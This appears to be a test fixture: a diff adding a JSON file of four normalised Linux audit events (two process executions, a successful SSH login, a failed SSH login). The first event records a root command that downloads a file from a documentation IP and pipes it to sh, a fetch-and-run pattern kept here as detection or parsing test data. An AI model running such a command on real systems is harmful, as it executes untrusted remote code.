@@ -1,0 +1,284 @@
+[
+  {
+    "event": {
+      "activity_id": 1,
+      "actor": {
+        "user": {
+          "uid": "1000"
+        }
+      },
+      "category_uid": 1,
+      "class_uid": 1007,
+      "device": {
+        "os": {
+          "name": "Linux",
+          "type_id": 200
+        }
+      },
+      "metadata": {
+        "product": {
+          "name": "auditd",
+          "vendor_name": "Linux Audit"
+        },
+        "sequence": 4521,
+        "version": "1.5.0"
+      },
+      "process": {
+        "cmd_line": "curl -o /tmp/x http://198.51.100.7/x && sh ",
+        "file": {
+          "path": "/usr/bin/curl"
+        },
+        "name": "curl",
+        "parent_process": {
+          "pid": 1200
+        },
+        "pid": 1234,
+        "session": {
+          "uid": "3"
+        },
+        "user": {
+          "uid": "0"
+        },
+        "working_directory": "/root"
+      },
+      "severity_id": 1,
+      "status_id": 1,
+      "time": 1727251200123,
+      "type_uid": 100701,
+      "unmapped": {
+        "SYSCALL.a0": "55d5c1a2b3c0",
+        "SYSCALL.a1": "55d5c1a2b4e0",
+        "SYSCALL.a2": "55d5c1a2b5f0",
+        "SYSCALL.a3": "0",
+        "a0": "curl",
+        "a1": "-o",
+        "a2": "/tmp/x",
+        "a3": "http://198.51.100.7/x && sh ",
+        "arch": "c000003e",
+        "argc": "4",
+        "egid": "0",
+        "euid": "0",
+        "exit": "0",
+        "fsgid": "0",
+        "fsuid": "0",
+        "gid": "0",
+        "items": "2",
+        "key": "exec",
+        "sgid": "0",
+        "subj": "unconfined",
+        "suid": "0",
+        "syscall": "59",
+        "tty": "pts0"
+      }
+    },
+    "id": "cfc4fad6d6cf520ae2ac229e89c5c817",
+    "issues": [],
+    "kind": "execve_x86_64"
+  },
+  {
+    "event": {
+      "activity_id": 1,
+      "actor": {
+        "user": {
+          "name": "bob",
+          "uid": "1001"
+        }
+      },
+      "category_uid": 1,
+      "class_uid": 1007,
+      "device": {
+        "hostname": "build-7",
+        "os": {
+          "name": "Linux",
+          "type_id": 200
+        }
+      },
+      "metadata": {
+        "product": {
+          "name": "auditd",
+          "vendor_name": "Linux Audit"
+        },
+        "sequence": 77,
+        "version": "1.5.0"
+      },
+      "process": {
+        "cmd_line": "id",
+        "file": {
+          "path": "/usr/bin/id"
+        },
+        "name": "id",
+        "parent_process": {
+          "pid": 880
+        },
+        "pid": 912,
+        "session": {
+          "uid": "5"
+        },
+        "user": {
+          "name": "bob",
+          "uid": "1001"
+        },
+        "working_directory": "/home/bob"
+      },
+      "severity_id": 1,
+      "status_id": 1,
+      "time": 1727251260500,
+      "type_uid": 100701,
+      "unmapped": {
+        "ARCH": "aarch64",
+        "EGID": "bob",
+        "EUID": "bob",
+        "FSGID": "bob",
+        "FSUID": "bob",
+        "GID": "bob",
+        "SGID": "bob",
+        "SUID": "bob",
+        "SYSCALL": "execve",
+        "SYSCALL.a0": "ffffd1e0",
+        "a0": "id",
+        "a1": "ffffd200",
+        "a2": "ffffd220",
+        "a3": "0",
+        "arch": "c00000b7",
+        "argc": "1",
+        "egid": "1001",
+        "euid": "1001",
+        "exit": "0",
+        "fsgid": "1001",
+        "fsuid": "1001",
+        "gid": "1001",
+        "items": "2",
+        "key": "(null)",
+        "sgid": "1001",
+        "subj": "unconfined",
+        "suid": "1001",
+        "syscall": "221",
+        "tty": "(none)"
+      }
+    },
+    "id": "b56bd080a4ac8480ba32dfa615470b2a",
+    "issues": [],
+    "kind": "execve_aarch64"
+  },
+  {
+    "event": {
+      "activity_id": 1,
+      "category_uid": 3,
+      "class_uid": 3002,
+      "device": {
+        "os": {
+          "name": "Linux",
+          "type_id": 200
+        }
+      },
+      "logon_process": {
+        "file": {
+          "path": "/usr/sbin/sshd"
+        },
+        "pid": 4410
+      },
+      "metadata": {
+        "product": {
+          "name": "auditd",
+          "vendor_name": "Linux Audit"
+        },
+        "sequence": 912,
+        "version": "1.5.0"
+      },
+      "session": {
+        "uid": "12"
+      },
+      "severity_id": 1,
+      "src_endpoint": {
+        "hostname": "203.0.113.9",
+        "ip": "203.0.113.9"
+      },
+      "status": "success",
+      "status_id": 1,
+      "time": 1727251300412,
+      "type_uid": 300201,
+      "unmapped": {
+        "AUID": "alice",
+        "ID": "alice",
+        "UID": "root",
+        "auid": "1000",
+        "msg": {
+          "addr": "203.0.113.9",
+          "exe": "/usr/sbin/sshd",
+          "hostname": "203.0.113.9",
+          "id": "1000",
+          "op": "login",
+          "res": "success",
+          "terminal": "/dev/pts/1"
+        },
+        "subj": "unconfined",
+        "uid": "0"
+      },
+      "user": {
+        "uid": "1000"
+      }
+    },
+    "id": "b890032c4d8f02a967b671b246e6d8d7",
+    "issues": [],
+    "kind": "login_success"
+  },
+  {
+    "event": {
+      "activity_id": 1,
+      "category_uid": 3,
+      "class_uid": 3002,
+      "device": {
+        "os": {
+          "name": "Linux",
+          "type_id": 200
+        }
+      },
+      "logon_process": {
+        "file": {
+          "path": "/usr/sbin/sshd"
+        },
+        "pid": 4502
+      },
+      "metadata": {
+        "product": {
+          "name": "auditd",
+          "vendor_name": "Linux Audit"
+        },
+        "sequence": 925,
+        "version": "1.5.0"
+      },
+      "session": {
+        "uid": "4294967295"
+      },
+      "severity_id": 1,
+      "src_endpoint": {
+        "hostname": "?",
+        "ip": "198.51.100.7"
+      },
+      "status": "failed",
+      "status_id": 2,
+      "time": 1727251311090,
+      "type_uid": 300201,
+      "unmapped": {
+        "auid": "4294967295",
+        "msg": {
+          "acct": "admin",
+          "addr": "198.51.100.7",
+          "exe": "/usr/sbin/sshd",
+          "hostname": "?",
+          "op": "login",
+          "res": "failed",
+          "terminal": "sshd"
+        },
+        "subj": "unconfined",
+        "uid": "0"
+      },
+      "user": {
+        "name": "admin"
+      }
+    },
+    "id": "7f0be5f7f6414b225b6ddb98d45203bf",
+    "issues": [],
+    "kind": "login_failure"
+  }
+]
